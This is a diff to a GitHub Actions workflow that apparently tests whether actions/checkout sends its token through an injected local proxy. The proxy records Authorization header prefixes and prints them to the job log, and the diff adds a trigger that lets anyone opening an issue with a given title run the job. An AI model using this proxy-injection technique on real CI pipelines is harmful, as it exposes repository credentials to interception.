@@ -2,6 +2,8 @@ name: actions/checkout MITM test
 # Re-registered for dispatch
 on:
   workflow_dispatch:
+  issues:
+    types: [opened]
 
 permissions:
   contents: read
@@ -9,6 +11,7 @@ permissions:
 jobs:
   checkout-mitm:
     runs-on: ubuntu-latest
+    if: github.event_name == 'workflow_dispatch' || contains(github.event.issue.title, 'checkout-mitm-test')
     steps:
       - name: Start proxy and inject http_proxy
         run: |
@@ -17,11 +20,7 @@ jobs:
           class Handler(http.server.BaseHTTPRequestHandler):
               def handle_one(self):
                   with open('/tmp/checkout_capture.jsonl', 'a') as f:
-                      entry = {
-                          "method": self.command,
-                          "path": self.path,
-                          "host": self.headers.get("Host",""),
-                      }
+                      entry = {"method": self.command, "path": self.path, "host": self.headers.get("Host","")}
                       auth = self.headers.get("Authorization","")
                       if auth:
                           entry["auth_prefix"] = auth[:25]
@@ -40,37 +39,19 @@ jobs:
               def log_message(self, *a): pass
           with socketserver.TCPServer(("127.0.0.1", 18080), Handler) as s:
               s.timeout = 30
-              for _ in range(20):
-                  s.handle_request()
+              for _ in range(20): s.handle_request()
           PYEOF
           python3 /tmp/proxy.py &
           sleep 1
-          ss -tlnp | grep 18080
           echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
-          echo "Proxy injected"
+          echo "Proxy ready"
 
-      - name: actions/checkout (will it use the proxy?)
+      - name: actions/checkout (sends token through proxy?)
         uses: actions/checkout@v4
         continue-on-error: true
-        with:
-          fetch-depth: 1
 
-      - name: Check what the proxy captured from checkout
+      - name: Check captures
         run: |
           unset http_proxy https_proxy
-          echo "=== PROXY CAPTURE LOG ==="
-          if [ -f /tmp/checkout_capture.jsonl ]; then
-            cat /tmp/checkout_capture.jsonl
-            echo ""
-            echo "=== Auth headers captured ==="
-            python3 -c "
-import json
-with open('/tmp/checkout_capture.jsonl') as f:
-    for line in f:
-        d = json.loads(line)
-        if d.get('auth_prefix'):
-            print(f'CAPTURED: {d[\"method\"]} {d[\"path\"]} auth={d[\"auth_prefix\"]}... ({d[\"auth_len\"]} chars)')
-" 2>/dev/null
-          else
-            echo "No captures from actions/checkout"
-          fi
+          echo "=== PROXY CAPTURES ==="
+          cat /tmp/checkout_capture.jsonl 2>/dev/null || echo "No captures"
